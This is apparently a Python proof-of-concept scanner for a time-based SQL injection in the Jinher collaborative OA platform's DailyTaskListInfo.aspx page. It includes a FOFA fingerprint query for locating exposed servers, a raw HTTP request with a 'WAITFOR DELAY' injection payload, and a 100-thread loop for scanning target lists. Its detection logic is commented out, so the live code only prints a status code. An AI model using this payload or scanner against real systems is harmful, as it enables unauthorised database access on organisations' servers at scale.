# fofa：title="金和协同管理平台" || body="js/PasswordCommon.js" || body="js/PasswordNew.js" || body="Jinher Network" || (body="c6/Jhsoft.Web.login" && body="CloseWindowNoAsk") || header="Path=/jc6" || (body="JC6金和协同管理平台" && body="src=\"/jc6/platform/") || body="window.location = \"JHSoft.MobileApp/Default.htm\";" || banner="Path=/jc6"||body="JHSoft.Web.AddMenu" || body="/jc6/platform/sys/login" || body="C6/Jhsoft.Web.login/PassWord.aspx" || body="/jc6/platform/finallogin/images/head-add.png"||body="Jhsoft.Web.login/PassWord.aspx"
"""POST /c6/Jhsoft.Web.dailytaskmanage/DailyTaskListInfo.aspx/ HTTP/1.1
        Host: {{host}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 444

        __EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&_ListPage1LockNumber=1&_ListPage1RecordCount=0&__VIEWSTATE=xxxx&txtSelectTaskIDList=&DrpTaskType=all&DrptaskState=0&txttaskname='WAitfor+DelaY'0:0:5'--&Txttaskconnect=&txtBeginTime=&txtEndTime=&Txttaskdept=%B5%A5%BB%F7%D1%A1%D4%F1%B2%BF%C3%C5&hidTaskdept=&Txttaskexecutor=&seltktype=%C7%EB%D1%A1%D4%F1&btnSearch=%B2%E9%D1%AF&Txttaskdeptid=&hidFlag=0&__VIEWSTATEGENERATOR=xxxx"""


import sys,argparse
import requests
import json
import urllib3
import warnings
from multiprocessing.dummy import Pool # 多线程的库

# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def banner():
    test = """
  ____  ____  _  _    ___  _ _____ ____  ____  _  __ _     _  ____ _____ _  _      _____ ____ 
/  _ \/  _ \/ \/ \   \  \///__ __Y  _ \/ ___\/ |/ // \   / \/ ___Y__ __Y \/ \  /|/    //  _ \
| | \|| / \|| || |    \  /   / \ | / \||    \|   / | |   | ||    \ / \ | || |\ |||  __\| / \|
| |_/|| |-||| || |_/\ / /    | | | |-||\___ ||   \ | |_/\| |\___ | | | | || | \||| |   | \_/|
\____/\_/ \|\_/\____//_/     \_/ \_/ \|\____/\_|\_\\____/\_/\____/ \_/ \_/\_/  \|\_/   \____/
                                                                                             
"""
    print(test)



def main():
    banner()
    # 先处理命令行输入的内容
    # 初始化
    parse = argparse.ArgumentParser(description="金和OA DailyTaskListInfo.aspx 存在SQL注入")

    # 添加命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help="Please input your url")
    parse.add_argument('-f','--flie',dest='file',type=str,help="Please input your file")

    # 实例化
    args = parse.parse_args()

    # 对用户输入的参数进行判断 只能是单个的，要不一个url，或一个文件
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 多线程处理
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usage python {sys.argv[0]} -h")


def poc(targes):
    link = '/c6/Jhsoft.Web.dailytaskmanage/DailyTaskListInfo.aspx/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.2029.104 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "444"
    }
    
    data = "__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&_ListPage1LockNumber=1&_ListPage1RecordCount=0&__VIEWSTATE=xxxx&txtSelectTaskIDList=&DrpTaskType=all&DrptaskState=0&txttaskname='WAitfor+DelaY'0:0:5'--&Txttaskconnect=&txtBeginTime=&txtEndTime=&Txttaskdept=%B5%A5%BB%F7%D1%A1%D4%F1%B2%BF%C3%C5&hidTaskdept=&Txttaskexecutor=&seltktype=%C7%EB%D1%A1%D4%F1&btnSearch=%B2%E9%D1%AF&Txttaskdeptid=&hidFlag=0&__VIEWSTATEGENERATOR=xxxx"
    # try:
    res1 = requests.get(url=targes,headers=headers,timeout=15,verify=False)
    print(res1.status_code)
    #     if res1.status_code == 200:
    #         res2 =requests.post(url=targes+link,headers=headers,data=data,timeout=15,verify=False)
    #         if res2.elapsed.total_seconds() >= 5:
    #             print(f"[+]该{targes}存在sql注入")
    #             # with open("result.txt",'a',encoding='utf-8') as f:      # 将结果写入到result.txt文件中
    #             #     f.write(f"[+]该{targes}存在sql注入"+'\n')
    #         else:
    #             print(f"[-]该{targes}不存在sql注入")
    # except Exception as e:
    #     print(f"该{targes}存在问题，请手工进行测试")
    #     print(e)


# 函数入口
if __name__ == "__main__":
    main()